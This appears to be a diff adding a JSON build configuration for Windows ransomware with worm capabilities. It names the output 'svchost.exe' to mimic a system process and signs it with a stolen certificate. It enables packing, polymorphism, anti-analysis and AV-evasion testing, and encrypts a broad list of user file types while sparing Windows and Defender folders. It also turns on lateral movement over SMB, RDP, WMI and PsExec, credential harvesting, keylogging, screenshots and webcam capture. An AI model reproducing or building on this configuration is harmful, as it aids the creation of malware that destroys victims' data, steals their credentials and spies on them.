@@ -1,0 +1,92 @@
+{
+  "source_dir": "src",
+  "output_dir": "release",
+  "main_executable": "svchost.exe",
+  "target_architecture": "x64",
+  
+  "compiler_flags": [
+    "/O2", "/GL", "/MT", "/DNDEBUG", "/GS-", "/Gy", "/Gm-",
+    "/EHsc", "/nologo", "/W0"
+  ],
+  
+  "linker_flags": [
+    "/SUBSYSTEM:WINDOWS", "/ENTRY:mainCRTStartup", "/LTCG",
+    "/OPT:REF", "/OPT:ICF", "/MANIFEST:NO", "/NOLOGO",
+    "/DYNAMICBASE:NO", "/NXCOMPAT:NO"
+  ],
+  
+  "obfuscation_level": "maximum",
+  "enable_anti_analysis": true,
+  "pack_executable": true,
+  "polymorphic_engine": true,
+  "code_virtualization": true,
+  
+  "inject_dll": true,
+  "dll_to_inject": "ntdll_hook.dll",
+  
+  "sign_binary": true,
+  "signing_cert": "stolen_cert.pfx",
+  "signing_password": "extracted_password",
+  "timestamp_server": "http://timestamp.sectigo.com",
+  
+  "post_build_commands": [
+    "upx --ultra-brute release/svchost.exe",
+    "python3 add_digital_signature.py",
+    "python3 test_av_evasion.py"
+  ],
+  
+  "encryption": {
+    "algorithm": "xchacha20poly1305",
+    "key_derivation": "argon2id", 
+    "iterations": 20,
+    "memory": 131072,
+    "parallelism": 8,
+    "master_key_entropy": 256
+  },
+  
+  "target_extensions": [
+    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+    ".pdf", ".rtf", ".odt", ".ods", ".odp", ".csv",
+    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".psd", ".ai",
+    ".mp3", ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".wav", ".flac",
+    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".iso", ".dmg",
+    ".sql", ".db", ".dbf", ".mdb", ".accdb", ".sqlite", ".sqlite3",
+    ".dwg", ".dxf", ".max", ".3ds", ".blend", ".skp",
+    ".pem", ".p12", ".pfx", ".key", ".crt", ".cer",
+    ".wallet", ".dat", ".log", ".cfg", ".ini", ".conf",
+    ".bak", ".backup", ".old", ".tmp", ".temp",
+    ".vmdk", ".vdi", ".vhd", ".ova", ".ovf",
+    ".m4a", ".aac", ".ogg", ".wma", ".opus",
+    ".webm", ".ogv", ".3gp", ".f4v", ".m4v",
+    ".indd", ".eps", ".cdr", ".sketch", ".fig",
+    ".c", ".cpp", ".h", ".java", ".py", ".js", ".php", ".rb", ".go",
+    ".json", ".xml", ".yaml", ".yml", ".toml"
+  ],
+  
+  "excluded_paths": [
+    "C:\\Windows\\System32",
+    "C:\\Windows\\SysWOW64", 
+    "C:\\Program Files\\Windows Defender",
+    "C:\\ProgramData\\Microsoft\\Windows Defender"
+  ],
+  
+  "advanced_evasion": {
+    "api_hashing": true,
+    "syscall_obfuscation": true,
+    "control_flow_flattening": true,
+    "string_encryption": "aes256",
+    "dummy_api_calls": 500,
+    "sleep_evasion": true,
+    "heap_spray_detection": true
+  },
+  
+  "payload_features": {
+    "worm_capabilities": true,
+    "lateral_movement": ["smb", "rdp", "wmi", "psexec"],
+    "credential_harvesting": true,
+    "screenshot_capture": true,
+    "keylogger": true,
+    "webcam_access": true,
+    "microphone_access": false
+  }
+}
